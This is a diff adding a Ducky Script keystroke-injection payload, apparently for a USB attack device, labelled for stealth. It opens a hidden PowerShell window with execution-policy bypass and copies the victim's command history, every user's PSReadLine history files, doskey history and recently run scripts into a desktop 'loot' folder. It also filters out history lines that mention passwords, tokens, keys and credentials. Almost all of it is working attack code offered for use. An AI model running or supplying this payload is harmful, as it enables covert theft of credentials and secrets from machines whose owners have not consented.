@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | PowerShell History & Secrets
+REM  FLLC - by PERSON FU
+REM  Time: ~8 seconds | Stealth: HIGH
+REM  PS history, recent commands, cached secrets
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\ps_history_loot';md $o -f|Out-Null;$r=@();$r+='=== POWERSHELL HISTORY DUMP ===';$r+='Time: '+(Get-Date);$h=(Get-PSReadlineOption).HistorySavePath;if(Test-Path $h){cp $h \"$o\ConsoleHost_history.txt\" -f;$lines=gc $h;$r+=\"Total commands: $($lines.Count)\";$r+='';$r+='=== COMMANDS WITH SECRETS ===';$lines|?{$_ -match 'pass|secret|key|token|cred|api|auth|login|connect'}|%{$r+=$_};$r+='';$r+='=== RECENT CONNECTIONS ===';$lines|?{$_ -match 'invoke-|curl|wget|ssh|rdp|net use|scp|ftp|iwr|irm|new-pssession|enter-pssession'}|%{$r+=$_}};$r+='';$r+='=== ALL USER HISTORIES ===';gci 'C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -ea 0|%{$r+='--- '+$_.FullName+' ---';gc $_.FullName -ea 0|select -l 200|%{$r+=$_}};$r+='';$r+='=== CMD HISTORY (doskey) ===';try{doskey /history|%{$r+=$_}}catch{};$r+='';$r+='=== RECENT SCRIPTS RUN ===';gci $env:TEMP -r -fi '*.ps1','*.bat','*.cmd','*.vbs' -ea 0|sort LastWriteTime -Desc|select -f 20|%{$r+=$_.FullName+' ('+$_.LastWriteTime+')'};$r|Out-File \"$o\results.txt\" -Encoding UTF8"
+ENTER
+DELAY 500
